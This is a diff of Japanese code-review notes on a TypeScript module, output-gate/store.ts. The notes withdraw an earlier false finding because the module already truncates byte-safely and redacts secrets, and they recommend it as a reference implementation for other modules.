 - 調査メモ: `mekann/context/output-gate/store.ts:133-153` を確認したところ、`sanitizeManifestSource` は `safeUtf8Slice(redactSecrets(value).text, maxStringBytes)` を使用。**byte-safe かつ秘密マスキング済み**の正しい実装。誤報として取り下げ。
-- 副産物の重要 positive note: `output-gate/store.ts` は `safeUtf8Slice`(byte-safe) + `redactSecrets`(IC-138 の正本) + WeakSet で循環参照検出と、**最も堅牢に実装されたモジュールの一つ**。この堅牢パターン(safeUtf8Slice + redactSecrets + Circular 検出)を他の 5 つの壊れた truncate サイト(IC-269)や autoresearch の filterSecrets(IC-138)に波及すべき。つまり output-gate/store.ts の設計を「リファレンス実装」として他モジュールが従う形が理想。
+- 副産物の重要 positive note: `output-gate/store.ts` は `safeUtf8Slice`(byte-safe) + `redactSecrets`(IC-138 の正本) + WeakSet で循環参照検出と、**最も堅牢に実装されたモジュールの一つ**。この堅牢パターン（safeUtf8Slice + redactSecrets + Circular検出）を他の壊れたtruncateサイト（IC-269）へ波及すべき。つまり output-gate/store.ts の設計を「リファレンス実装」として他モジュールが従う形が理想。
 
 ---
 
